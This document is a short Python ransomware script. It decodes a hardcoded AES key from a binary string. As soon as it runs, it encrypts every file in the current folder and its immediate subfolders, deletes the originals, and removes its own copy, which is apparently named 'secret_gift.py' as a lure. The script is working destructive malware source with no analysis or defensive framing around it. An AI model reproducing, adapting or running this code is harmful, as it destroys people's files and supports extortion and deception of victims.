import os
try:
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
except:
    os.system('python3 -m pip install Crypto')


def hash_key(key):
    return SHA256.new(key.encode()).digest()


values = '01100001011101110110010101110011011011110110110101100101'
mk = ''.join([chr(int(values[i:i + 8], 2)) for i in range(0, len(values), 8)])
print(mk)
block_size = 64 * 1024


def encryption(filename, key):
    if filename.startswith('encrypted%%%'):
        print(f'{filename} alredy encrytpted')
        return
    encryptor = AES.new(hash_key(key), AES.MODE_ECB)
    filesize = str(os.path.getsize(filename)).zfill(16)
    with open(filename, 'rb') as infile:
        with open('encrypted%%%{}'.format(filename), 'wb') as outfile:
            outfile.write(filesize.encode())
            while True:
                data = infile.read(block_size)
                if len(data) == 0:
                    break
                elif len(data) < block_size:
                    data += b' ' * (block_size - len(data))
                outfile.write(encryptor.encrypt(data))
    os.remove(filename)


def ransomencryption():
    pwd = os.getcwd()

    files = list(os.walk(pwd))[0][2]

    for each in files:
        encryption(each, mk)

    folders = list(os.walk(pwd))[0][1]
    #print('folders:', folders)
    for folder in folders:
        #print('working on ', folder)
        os.chdir(os.path.join(pwd, folder))
        print(os.getcwd())
        files = list(os.walk(os.getcwd()))[0][2]
        #print(f'{folder} --> {files}')
        for each in files:
            encryption(each, mk)
        os.chdir(pwd)

    os.remove('encrypted%%%secret_gift.py')


ransomencryption()
